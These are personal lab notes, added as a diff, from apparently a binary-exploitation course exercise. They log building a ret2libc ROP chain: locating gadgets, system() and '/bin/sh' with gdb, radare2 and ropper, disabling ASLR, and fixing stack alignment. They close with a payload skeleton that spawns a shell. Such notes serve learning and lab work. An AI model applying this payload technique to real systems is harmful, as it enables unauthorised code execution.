@@ -1,0 +1,66 @@
+2022.09.27.0819.EST
+
+[NOTE] /lib64/ld-linux-x86-64.so.2 is aparantly the kernel library that is loaded. Should be libc... maybe?
+[NOTE] You can use gdb's next instruction (ni) to run each line individually instead of stepping into by default
+
+You can find rop gadgets via [ropper -f ./somefile --search "some instruction"]
+Or via radare via [/ bin] search and confirm with gdb via [x /s 0x????????]
+
+System, when printed, for me is 0x7f949dbd94e0. Never changes (of course due to ASLR being disabled)
+
+main() is at 0x4012ef
+main() ret is at 0x4013b4
+
+Thing is I need to know exactly what system is returning. Maybe it's the head of the libc library?
+I can't seem to find any simple answers on google. Only a pointer to a forked process using system()
+Which I don't think is what I want
+
+[info sharedlibrary] shows where /lib64/ld-linux-x86-64.so.2 is loaded, but that is different than the system return
+[info proc mappings]
+
+Foud a rop gadget for pop rdi at 0x401423: pop rdi; ret
+
+Radare found /bin/sh at 0x4020d5, but gdb indicated it was actually at 0x4020d0 [via x /s 0x4020d5]
+
+Derp... just found out I didn't make ASLR disabled to survive a reboot...
+The ACTUAL  system is now 0x7ffff7dfa4e0 when ASLR is disabled
+To make it persistant /etc/sysctl.d/01-disable-aslr.conf needs to contain kernel.randomize_va_space = 0
+Temp disabling is echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
+
+radare2's [/ /bin/sh] finds 0x4020d0
+ropper -f ./lab4-2.bin --search "/bin/sh" found nothing
+In gdb breaking on main's ret [find &system,+9999999,"/bin/sh"] returns 0x7ffff7f61117 which is '/bin/sh' in libc's system function
+I found the delta and was able to dynamically add the delta to system's offset (gdb's [p system] on break on main's ret)
+However this didn't work on the target machine, and the offset is different for an ubuntu machine
+The delta I calculate for my machine is 0x166c37 and [x /s 0x7ffff7dfa4e0 + 0x166c37] does return '/bin/sh'
+I'm not sure what is going on here
+
+As an aside we can use [ropper --file ./lab4-2.bin --search "% ?di"] to find a 'pop rdi' gadget
+
+Can use radare2 to break at main's ret by opening in debug mode [ood] and adding a breakpoint [dcu 0x4013b4] to run
+If you want to use [/ /bin/sh] you should be running as sudo to avoid segfaults
+
+To search within a range you should type something like this
+[0x004013b4]> e.search.in=range
+[0x004013b4]> e.search.from=0x7ffff7dfa4e0 [system() start]
+[0x004013b4]> e.search.to=0x7ffff7ffffff [some large value that should hopefully encompass system() at least]
+[0x004013b4]> / /bin/sh
+Canceling the search with Ctrl+C will show you what it has found sofar
+For me this only returned 0x7ffff7f61117 which I already knew about
+
+movaps is causing issues I think. I think the stack isn't properly aligned when the system() call is made, and this is causing issues on the ubuntu machine. For some reason it works on kali though... dunno why tbh
+Detailed in https://ropemporium.com/guide.html
+I guess my kali's GLIBC doesn't use movaps
+
+You can find gadgets (again using the range thing listed above if you want) with radare2 while running in memory with [/R gadgetstring], or [/R/ gadgetstringREGEX]
+
+So movaps WAS the issue. The stack frame was misaligned by 8 bytes.
+By realigning it to 16 byte increments it worked out. This was accomplished like so:
+payload = b""
+payload += overflow
+payload += gadgets["pop rdi"]
+payload += bin_sh
+payload += gadgets["ret"]
+payload += system
+payload += b"\n"
+This basically calls two rets in a row making the stack divisible by 16 bytes again. Yay!
